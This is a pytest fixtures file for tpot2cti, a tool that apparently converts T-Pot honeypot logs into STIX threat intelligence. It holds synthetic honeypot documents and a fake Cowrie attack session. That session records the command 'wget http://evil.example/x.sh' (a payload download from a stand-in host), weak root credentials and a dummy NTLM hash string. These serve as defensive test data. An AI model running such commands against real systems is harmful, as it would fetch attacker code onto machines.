"""Shared fixtures for the tpot2cti test suite.

Per the 2026-05-22 audit #7: this is the minimum-viable test scaffold —
keep fixtures small, importable, and free of network I/O.  Parsers,
builder, config, state are all happy without a live ES or OpenCTI.

Every fixture below is in-process only.  The ``cfg`` fixture seeds the
three required env vars via ``_smoketest_env()`` (matching the parser
__main__ blocks) so ``load_config()`` doesn't raise.
"""

from __future__ import annotations

from datetime import datetime, timezone
from pathlib import Path

import pytest

from tpot2cti.parsers.base import (
    AttackSession,
    ParsedEvent,
    _smoketest_env,
)


# Seed env once at collection time so module-level ``load_config()`` calls
# inside tests don't blow up.
_smoketest_env()


@pytest.fixture(scope="session")
def cfg():
    """Minimal in-process Config (uses _smoketest_env defaults)."""
    from tpot2cti.config import load_config
    return load_config()


@pytest.fixture()
def builder(cfg):
    """Fresh STIXBuilder per test — preserves per-bundle dedup semantics."""
    from tpot2cti.stix.builder import STIXBuilder
    return STIXBuilder(cfg)


@pytest.fixture(scope="session")
def parser_registry():
    """Return the parser registry dict (importing parsers triggers
    auto-registration). Includes the __fallback__ sentinel."""
    import tpot2cti.parsers as P  # triggers _auto_register()
    return dict(P._PARSERS)


@pytest.fixture()
def state_db(tmp_path):
    """A fresh CycleState backed by a tmp SQLite file."""
    from tpot2cti.state import CycleState
    return CycleState(db_path=tmp_path / "state.db")


@pytest.fixture()
def now_utc():
    """A frozen UTC timestamp for synthetic events."""
    return datetime(2026, 5, 22, 12, 0, 0, tzinfo=timezone.utc)


# ---------------------------------------------------------------------------
# Per-parser synthetic ES docs
# ---------------------------------------------------------------------------
# One minimal-but-valid doc per registered parser type.  Used by the
# parameterized test_parsers sweep.  Keep these SHORT — only fields the
# parser actually reads to produce a non-None ParsedEvent.  Optional
# enrichment (geoip, login_success etc.) is omitted on purpose so the
# sweep tests the parse() floor, not its ceiling.
# ---------------------------------------------------------------------------


def make_common_doc(type_name: str, *, now: datetime) -> dict:
    """Base doc shape every T-Pot honeypot ships."""
    return {
        "@timestamp": now.isoformat(),
        "src_ip": "203.0.113.42",
        "src_port": 54321,
        "dest_port": 22,
        "dest_ip": "10.0.0.1",
        "t-pot_hostname": "node1",
        "type": type_name,
        "geoip": {
            "country_iso_code": "RU",
            "country_name": "Russia",
            "city_name": "Moscow",
            "asn": 12345,
            "organization": "ExampleNet",
        },
    }


def _suricata_doc(now):
    d = make_common_doc("Suricata", now=now)
    d["alert"] = {
        "signature": "ET SCAN Generic Scanner",
        "signature_id": 2000001,
        "category": "Attempted Information Leak",
        "severity": 3,
    }
    return d


@pytest.fixture()
def parser_docs(now_utc):
    """Map from parser type_name -> a minimal synthetic ES doc.

    Covers every registered parser plus the fallback sentinel.  Each
    doc is the smallest input that produces a non-None ParsedEvent.
    """
    return {
        "Adbhoney":      make_common_doc("Adbhoney", now=now_utc),
        "Ciscoasa":      make_common_doc("Ciscoasa", now=now_utc),
        "ConPot":        make_common_doc("ConPot", now=now_utc),
        "Cowrie":        make_common_doc("Cowrie", now=now_utc),
        "Dicompot":      make_common_doc("Dicompot", now=now_utc),
        "Dionaea":       make_common_doc("Dionaea", now=now_utc),
        "ElasticPot":    make_common_doc("ElasticPot", now=now_utc),
        "Fatt":          make_common_doc("Fatt", now=now_utc),
        "H0neytr4p":     make_common_doc("H0neytr4p", now=now_utc),
        "Heralding":     make_common_doc("Heralding", now=now_utc),
        "Honeyaml":      make_common_doc("Honeyaml", now=now_utc),
        "Honeytrap":     make_common_doc("Honeytrap", now=now_utc),
        "Ipphoney":      make_common_doc("Ipphoney", now=now_utc),
        "Mailoney":      make_common_doc("Mailoney", now=now_utc),
        "Medpot":        make_common_doc("Medpot", now=now_utc),
        "Miniprint":     make_common_doc("Miniprint", now=now_utc),
        "RDPHoneypot":   {
            **make_common_doc("RDPHoneypot", now=now_utc),
            "eventid": "rdphoneypot.login",
            "session": "0123456789ab",
            "username": "Administrator",
            "password": "",
            "domain": "",
            "derived_domain": "WORKGROUP",
            "auth_method": "NLA",
            "nt_response": "0101000000000000",
            "message": ("Login from 203.0.113.42:1234, hostname: 'PC1' "
                        "to domain: 'WORKGROUP', username: 'Administrator', "
                        "hashcat: 'Administrator::WORKGROUP:aa:bb:cc'."),
        },
        "NGINX":         make_common_doc("NGINX", now=now_utc),
        "Redishoneypot": make_common_doc("Redishoneypot", now=now_utc),
        "Router":        make_common_doc("Router", now=now_utc),
        "Sentrypeer":    make_common_doc("Sentrypeer", now=now_utc),
        "Suricata":      _suricata_doc(now_utc),
        "Tanner":        make_common_doc("Tanner", now=now_utc),
        "Wordpot":       make_common_doc("Wordpot", now=now_utc),
        "Beelzebub":     make_common_doc("Beelzebub", now=now_utc),
        "Galah":         make_common_doc("Galah", now=now_utc),
        # Galah's internal `type` field clobbers logstash's type=Galah
        # via the codec=json directive (see galah.py docstring); we
        # register GalahParser under each known internal type so the
        # dispatcher routes them correctly. Same fixture is fine for
        # all five — parse() ignores doc["type"] and sets event.event_type
        # to "Galah" unconditionally.
        "contentGenerationError": make_common_doc("Galah", now=now_utc),
        "emptyLLMResponse":       make_common_doc("Galah", now=now_utc),
        "failedResponse":         make_common_doc("Galah", now=now_utc),
        "invalidJSONResponse":    make_common_doc("Galah", now=now_utc),
        "successfulResponse":     make_common_doc("Galah", now=now_utc),
        "cacheHit":               make_common_doc("Galah", now=now_utc),
        "__fallback__":  make_common_doc("BrandNewType", now=now_utc),
    }


@pytest.fixture()
def synthetic_session(now_utc):
    """A fully-substantive synthetic Cowrie AttackSession.

    Useful as a builder input for tests that need a non-trivial session
    without hand-rolling one per test.
    """
    e = ParsedEvent(
        src_ip="203.0.113.99",
        timestamp=now_utc,
        sensor_hostname="node1",
        event_type="Cowrie",
        dst_port=22,
        session_id="testsession001",
        src_country_code="US",
        src_country_name="United States",
        src_asn=64500,
        src_as_org="ExampleNet",
    )
    s = AttackSession.from_event(e)
    s.auth_success = True
    s.commands = ["uname -a", "wget http://evil.example/x.sh"]
    s.malware_hashes = ["a" * 64]
    s.credentials_tried = [("root", "123456")]
    s.urls = ["http://evil.example/x.sh"]
    s.domains = ["evil.example"]
    s.hassh = "deadbeefcafebabe1234"
    return s
